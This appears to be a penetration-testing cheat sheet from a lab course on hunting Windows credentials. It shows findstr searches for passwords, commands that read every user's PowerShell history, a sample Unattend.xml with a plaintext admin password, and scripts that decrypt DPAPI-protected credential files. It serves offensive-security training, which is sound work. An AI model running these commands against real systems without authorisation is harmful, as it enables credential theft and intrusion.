# Credential Hunting

***

### <mark style="color:red;">Application Configuration Files</mark>

<mark style="color:green;">**Searching for Files**</mark>

{% code fullWidth="true" %}
```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

findstr /SIM /C:"password" C:\Users\*.txt C:\Users\*.ini C:\Users\*.cfg C:\Users\*.config C:\Users\*.xml

```
{% endcode %}

***

### <mark style="color:red;">Dictionary Files</mark>

<mark style="color:green;">**Chrome Dictionary Files**</mark>

{% code fullWidth="true" %}
```powershell
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```
{% endcode %}

***

### <mark style="color:red;">Unattended Installation Files</mark>

<mark style="color:green;">**Unattend.xml**</mark>

```xml
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="specialize">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <AutoLogon>
                <Password>
                    <Value>local_4dmin_p@ss</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>2</LogonCount>
                <Username>Administrator</Username>
            </AutoLogon>
            <ComputerName>*</ComputerName>
        </component>
    </settings>
```

***

### <mark style="color:red;">PowerShell History File</mark>

<mark style="color:green;">**Command to**</mark>

{% code fullWidth="true" %}
```powershell
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt.
```
{% endcode %}

<mark style="color:green;">**Confirming PowerShell History Save Path**</mark>

{% hint style="warning" %}
As seen in the (handy) Windows Commands PDF, published by Microsoft [here](https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf), there are many commands which can pass credentials on the command line. We can see in the example below that the user-specified local administrative credentials to query the Application Event Log using [wevutil](https://ss64.com/nt/wevtutil.html).
{% endhint %}

{% code fullWidth="true" %}
```powershell
(Get-PSReadLineOption).HistorySavePath

C:\Users\htb-student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
{% endcode %}

<mark style="color:green;">**Reading PowerShell History File**</mark>

{% code fullWidth="true" %}
```powershell
gc (Get-PSReadLineOption).HistorySavePath
```
{% endcode %}

{% code overflow="wrap" fullWidth="true" %}
```powershell
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```
{% endcode %}

***

### <mark style="color:red;">PowerShell Credentials</mark>

{% hint style="warning" %}
Les identifiants PowerShell sont souvent utilisés pour les scripts et les tâches d'automatisation comme moyen de stocker des identifiants cryptés de manière pratique. Les identifiants sont protégés par DPAPI, ce qui signifie généralement qu'ils ne peuvent être décryptés que par le même utilisateur sur le même ordinateur où ils ont été créés.

Prenons, par exemple, le script suivant `Connect-VC.ps1`, qu'un administrateur système a créé pour se connecter facilement à un serveur vCenter.
{% endhint %}

{% code fullWidth="true" %}
```powershell
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword
```
{% endcode %}

<mark style="color:green;">**Decrypting PowerShell Credentials**</mark>

{% hint style="info" %}
If we have gained command execution in the context of this user or can abuse DPAPI, then we can recover the cleartext credentials from `encrypted.xml`. The example below assumes the former.
{% endhint %}

```powershell
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username

$credential.GetNetworkCredential().password
```

{% code fullWidth="true" %}
```powershell
Clear-Host
Set-Location C:\

$filepath = Get-ChildItem -Recurse -Filter pass.xml -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName -First 1

if ($filepath) {
    $credential = Import-Clixml -Path $filepath
    $credential.GetNetworkCredential().username
    $credential.GetNetworkCredential().password
} else {
Write-Output “No pass.xml file found.”
}
```
{% endcode %}
